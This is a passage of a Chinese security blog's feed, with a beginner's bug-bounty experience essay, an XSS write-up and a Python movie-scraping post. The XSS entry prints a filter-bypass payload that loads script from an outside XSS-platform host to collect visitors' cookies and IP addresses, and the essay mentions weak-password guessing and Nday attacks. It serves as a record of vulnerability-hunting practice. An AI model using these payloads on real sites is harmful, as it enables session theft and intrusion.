      &lt;h1 id=&quot;0x01-概述&quot;&gt;&lt;a href=&quot;#0x01-概述&quot; class=&quot;headerlink&quot; title=&quot;0x01 概述&quot;&gt;&lt;/a&gt;0x01 概述&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;使用Python3开发&lt;/li&gt;
&lt;li&gt;结果导出为Output_Result.csv文件&lt;/li&gt;
&lt;li&gt;使用在线平台（&lt;a href=&quot;http://whatweb.bugscaner.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://whatweb.bugscaner.com&lt;/a&gt;）进行指纹识别&lt;/li&gt;
&lt;li&gt;项目下载地址：&lt;a href=&quot;https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Batch-identification-of-website-CMS-fingerprints&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;0x02-使用方法&quot;&gt;&lt;a href=&quot;#0x02-使用方法&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用方法&quot;&gt;&lt;/a&gt;0x02 使用方法&lt;/h1&gt;
    
    </summary>
    
      <category term="资源分享" scheme="https://www.teamssix.com/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="批量工具" scheme="https://www.teamssix.com/tags/%E6%89%B9%E9%87%8F%E5%B7%A5%E5%85%B7/"/>
    
      <category term="指纹识别" scheme="https://www.teamssix.com/tags/%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】小白挖洞十天经验分享</title>
    <link href="https://www.teamssix.com/year/190709-202131.html"/>
    <id>https://www.teamssix.com/year/190709-202131.html</id>
    <published>2019-07-09T12:21:31.000Z</published>
    <updated>2019-11-02T12:22:32.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。<br>事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。<br>其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。</p><a id="more"></a><h1 id="0x02-相信自己"><a href="#0x02-相信自己" class="headerlink" title="0x02 相信自己"></a>0x02 相信自己</h1><p>这四个字，估计每个人都听过，但是如果没有这四个字，我估计我现在还在犹豫、怀疑自己、不敢去挖洞的环境中。毕竟一件事情如果还没有去做就开始否定自己，那结局注定是失败的，连开始的勇气都没有，又怎能谈何成功。<br>所以如果你现在正处在想要开始挖洞却又不知道从哪里下手的情况时，那就先打开漏洞平台，补天、漏洞盒子什么的都行，注册个账号，接下来该干什么且听我一一道来。</p><h1 id="0x03-看清自己"><a href="#0x03-看清自己" class="headerlink" title="0x03 看清自己"></a>0x03 看清自己</h1><p>这四个字，是说要明白自己有几斤几两，也就是说要有自知之明，为什么这样说呢，因为你如果上来就挖专属SRC、企业SRC的话，估计会挖到怀疑人生，所以刚开始还是先从公益SRC入手，补天上上百个公益SRC，总能找到那么几个是存在漏洞的，注意，这里说总能找到那么几个，也就是说挖不挖得着看运气咯？<br>事实上，我确实是这样的，挖不挖得到完全看运气，有时运气好了，一个站碰到很多漏洞，低危、中危、高危都齐了，有时候啥也挖不到，而这种看似运气不好的时候往往占据了很大比重，但在我看来，归根结底就两点原因：一是经验不足，二是过早放弃。<br>经验不足没事儿，多挖就行，时间可以解决，过早放弃却不是那么容易解决的，下面我们就来好好唠唠这点。</p><h1 id="0x04-总结记录"><a href="#0x04-总结记录" class="headerlink" title="0x04 总结记录"></a>0x04 总结记录</h1><p>这四个字，很容易理解，那和刚才说的过早放弃又有什么关系呢？<br>首先我们一起来想想为什么会过早的放弃，在我看来还是不相信自己，在这个时候你已经有勇气开始挖洞了，但是在挖洞的过程中碰到了困难，所以就想到了放弃。<br>打开网页看到底部的360Logo，于是关闭网页，继续下一个公益SRC；在URL参数后面加引号回车一看，知道创宇为您保驾护航，于是关闭网页，继续下一个公益SRC；突然发现有个网站存在有漏洞的CMS，于是打开hackbar，Loadurl，加上Payload，Execute执行，一顿操作猛如虎，网站却提示你提交的数据包含非法字符，于是关闭网页，继续下一个公益SRC。<br>其实这就是我刚开始几天的真实写照，慢慢的发现，这样可不行，太打击人了吧，于是开始有了 自己的总结，有了自己的挖洞思路。<br>我自己写的总结就是记录整个挖洞过程，不管最后有没有挖到，都给记录下来，比如先看这个网站用的什么语言、操作系统、数据库版本，之后再看这个网站有没有用CMS，接着继续记录这个网站哪里可能存在漏洞，但自己没有复现出来，又或者这个网站的登陆页面是什么，自己注册了什么账号等等，反正只要稍微有些价值的信息都给记录下来，那记录这有什么用，只是为了记录吗？当然不是，首先一点就是过几天或者过段时间之后通过之前的记录你可能会找到当时没有复现出来的漏洞，还有另外一点在我看来也是很重要的一点，就是形成自己的挖洞思路。<br>在我挖了几天之后，慢慢的心中就有了一个大概的挖洞步骤，之后便记录了下来，比如刚开始我一般利用Google Hacking去收集一些网站的登陆窗口什么的，刚开始就各种弱密码碰运气，期间还真碰到一个管理员弱密码的站，之后发现有些网站公告里会提到默认密码多少多少，于是继续Google Hacking搜索网站相关的公开默认密码，又或者找到存在发送短信的地方，看看有没有短信轰炸等逻辑漏洞，之后又去批量识别网站CMS，对存在低版本的网站进行Nday攻击等等，慢慢的自己就形成了一个挖洞思路，而且随着经验的不断丰富，这样的一份漏洞挖掘思路报告也会越来越详细，说到这里，不知道你有没有想到过早放弃和总结经验之间的联系。<br>当你开始总结经验的时候，开始去记录开始去总结的那一刻，如果你碰到了问题，没关系，你可以看看自己总结的挖洞思路中还有没有记录其他的方法，如果真的已经没有思路了，那也没关系，把刚才渗透这个网站获取到的信息记录下来之后，开始下一个网站的漏洞挖掘。这时你应该发现，此时已经不存在什么过早放弃的概念了，因为当记录的那一刻起，以后如果有什么新的奇淫技巧依旧可以翻翻看看，挖到高危都是没准的事儿，最后就再说一点关于学习的事儿。</p><h1 id="0x05-终身学习"><a href="#0x05-终身学习" class="headerlink" title="0x05 终身学习"></a>0x05 终身学习</h1><p>这四个字，很重要，但熟悉我的人知道，我的成绩很一般，因为我不太喜欢学习，这里说的学习是指学习自己不感兴趣的东西，而对于我自己感兴趣的东西，那可真是太喜欢了。<br>这是挖洞十天经验分享，以后或许会有挖洞十月经验分享，亦或者会有挖洞十年经验分享，不管技术怎么发展变化，保持一个终身学习的心态始终不至于和时代脱节，尤其在网安的圈子，终身学习更是至关重要。如果你的兴趣不在网安，我想本文同样适用于你，不论什么领域什么方向，首先要踏出第一步，其次看清自己几斤几两，最后在不断的失败中去总结成长。<br>看到现在，相信你也发现刚才说的那么多更多的是经验分享，没有太多的挖洞技巧，毕竟人家还是个小白萌新，关于挖洞技巧在我的公众号（TeamsSix）会有分享，可以关注关注，如果本视频对你有帮助，欢迎点赞收藏一键三连，好了，汤家凤、朱伟他们还等着我呢，拜拜。</p><p>本文视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=58541759&cid=102097106&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av58541759/" title="源链接" target="_blank" rel="noopener">源链接</a>进行观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;十天是指六月三十号到七月九号这十天的时间，这段时间正值暑假刚开始，虽然知道现在需要备战考研，但是看了几天书后却怎么也看不进去，这时刚好有个作业就是挖洞，于是再一次把考研的书扔到了一边。&lt;br&gt;事先声明一下，因为是小白挖洞分享，所以难免会存在错误的地方，希望多多指正与包涵。&lt;br&gt;其实自己早在一年前就有挖洞的想法，在那个时候虽然知道很多工具的使用方法，但是对于如何挖洞依旧一头雾水，慢慢的一年的时间就在自我否定与怀疑自己中过去了，因此今天分享的第一点就是要相信自己。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
      <category term="漏洞挖掘" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="小白" scheme="https://www.teamssix.com/tags/%E5%B0%8F%E7%99%BD/"/>
    
  </entry>
  
  <entry>
    <title>【渗透实例】记录一次XSS渗透过程</title>
    <link href="https://www.teamssix.com/year/190703-221956.html"/>
    <id>https://www.teamssix.com/year/190703-221956.html</id>
    <published>2019-07-03T14:19:56.000Z</published>
    <updated>2019-11-02T12:22:44.797Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-找到存在XSS的位置"><a href="#0x01-找到存在XSS的位置" class="headerlink" title="0x01 找到存在XSS的位置"></a>0x01 找到存在XSS的位置</h1><p>没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用的XSS代码：&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss1.png" alt></p><h1 id="0x02-构造XSS代码连接到XSS平台"><a href="#0x02-构造XSS代码连接到XSS平台" class="headerlink" title="0x02 构造XSS代码连接到XSS平台"></a>0x02 构造XSS代码连接到XSS平台</h1><p>XSS平台给我们的XSS代码是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;&quot;&gt;&lt;sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss2.png" alt><br>直接插入的话会提示参数非法，经过多次尝试，最后发现该平台会对双引号、script字符进行识别过滤，大小写会被过滤，于是尝试插入下面的语句:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&apos;\&quot;&gt;&lt;\sCRiPt sRC=https://xss8.cc/3Ri4&gt;&lt;/\sCrIpT&gt;</span><br></pre></td></tr></table></figure><p>这条代码比上面平台给的XSS代码的多了几个 “&quot;，也就是转义字符，利用转义字符可以绕过该平台的策略，因为经验不足，所以在这一步尝试了很多种办法都没能绕过，要不有的可以插入但是连不上XSS平台，要不有的就是被识别拦截。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss3.png" alt><br>加上转义字符成功插入后，刷新目标网站与XSS平台页面，在XSS平台就能看到刚才的访问记录。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xss4.png" alt><br>这里可以获取该登陆用户的Cookie、User-Agent、IP地址什么的，但是触发这个XSS需要登陆存在XSS的账号才行，所以个人觉着知道了这个Cookie也没啥用。<br>并且虽然知道这里存在XSS，但是触发条件是需要知道用户名和密码，然后来到收货地址页面，所以个人感觉作用不大，因此在想这个漏洞还有没有其他的利用价值，后续或许会继续更新本次渗透过程，如果你有什么好的想法，欢迎下方留言。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-找到存在XSS的位置&quot;&gt;&lt;a href=&quot;#0x01-找到存在XSS的位置&quot; class=&quot;headerlink&quot; title=&quot;0x01 找到存在XSS的位置&quot;&gt;&lt;/a&gt;0x01 找到存在XSS的位置&lt;/h1&gt;&lt;p&gt;没什么技巧，见到框就X，功夫不负有心人，在目标网站编辑收货地址处发现了存在XSS的地方，没想到这种大公司还会存在XSS。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透实例" scheme="https://www.teamssix.com/categories/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
    
    
      <category term="渗透实例" scheme="https://www.teamssix.com/tags/%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/"/>
    
      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>【Python实例】让Python告诉你B站观影指南</title>
    <link href="https://www.teamssix.com/year/190619-202702.html"/>
    <id>https://www.teamssix.com/year/190619-202702.html</id>
    <published>2019-06-19T12:27:02.000Z</published>
    <updated>2019-11-02T12:22:00.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie1.png" alt><br>点进去之后发现UP主居然手动统计了160多部电影，最后他做成了一个表格，看完了之后立刻给了三连，因为在我看来每一位付出了努力与汗水的UP主都值得被尊重（疯狂暗示），事后就想到能不能用我这三脚猫的Python水平统计一下B站最值得看的电影呢？<br>有了想法，立刻从床上爬了起来，在夜黑风高的晚上开始垒起了代码，终于经历了一个通宵的时间之后完成了这个想法。</p><h1 id="0x01-代码运行"><a href="#0x01-代码运行" class="headerlink" title="0x01 代码运行"></a>0x01 代码运行</h1><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie2.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie3.png" alt></p><blockquote><p>具体代码见文章底部链接</p></blockquote><h1 id="0x02-运行结果"><a href="#0x02-运行结果" class="headerlink" title="0x02 运行结果"></a>0x02 运行结果</h1><p>通过刚才的运行结果，可以看到，播放数量最高的是《你的名字》，足足有一千八百多万的播放量<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie4.png" alt><br>弹幕数量最高的还是《你的名字》，有高达98万条弹幕<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie5.png" alt><br>硬币数量最多的依然是《你的名字》，硬币数量达到了39万个<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie6.png" alt><br>追剧人数最高的《命运之夜–天之杯：恶兆之花》<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie7.png" alt><br>B站评分最高的不详，因为评分最高9.9的视频比较多，所以B站评分没有统计到视频最后的汇总里<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie8.png" alt><br>在B站的电影中豆瓣评分最高的是《武林外传》，高达9.5分<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie9.png" alt><br>B站评分与豆瓣评分差最大的是《深夜食堂》，两个平台差了7分，这部电影我也看过，表示还阔以，不明白为什么豆瓣评分那么低。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie10.png" alt><br>ok，最后我们再来总结一下，B站的电影中播放数量、弹幕数量、硬币数量最高的均为《你的名字》，可以说是B站电影区当之无愧的C位，其余《刀剑神域：序列之争》《声之形》《白蛇：缘起》也都经常出现在前三之中。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie11.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie12.png" alt></p><h1 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h1><p>在视频的最后再简单说两句，这些数据都是可以导出为表格的，另外在写代码的中间有个小插曲，就是在获取豆瓣搜索结果中电影评分的时候，发现电影数据都是被加密的，就像这个样子<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie13.png" alt><br>最后通过SergioJune在Github上提供的代码得以解决，在这里也向他表示感谢<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/bilibili_movie14.png" alt></p><blockquote><p>文章代码：<a href="https://github.com/teamssix/bilibili-movie" target="_blank" rel="noopener">https://github.com/teamssix/bilibili-movie</a></p></blockquote><p>演示视频：</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=56117996&cid=98086981&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"> </iframe></div><p>如果视频不能全屏播放，请点击<a href="https://www.bilibili.com/video/av56117996/" title="源链接" target="_blank" rel="noopener">源链接</a>观看。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;hello大家好，这里是TeamsSix，昨天晚上11点多的突然想在B站看电影了，但是又不知道那个电影值得看，于是首先想到的是去各大影评UP主的频道里面看看，转了几圈后发现他们讲解的电影B站很多都没有，这个时候又想到了一种方法，就是在B站搜索：“在B站值得看的电影”，没想到以前还真有UP主统计过：&lt;/p&gt;
    
    </summary>
    
      <category term="实例演示" scheme="https://www.teamssix.com/categories/%E5%AE%9E%E4%BE%8B%E6%BC%94%E7%A4%BA/"/>
    
    
      <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
      <category term="电影" scheme="https://www.teamssix.com/tags/%E7%94%B5%E5%BD%B1/"/>
    
      <category term="爬虫" scheme="https://www.teamssix.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
</feed>
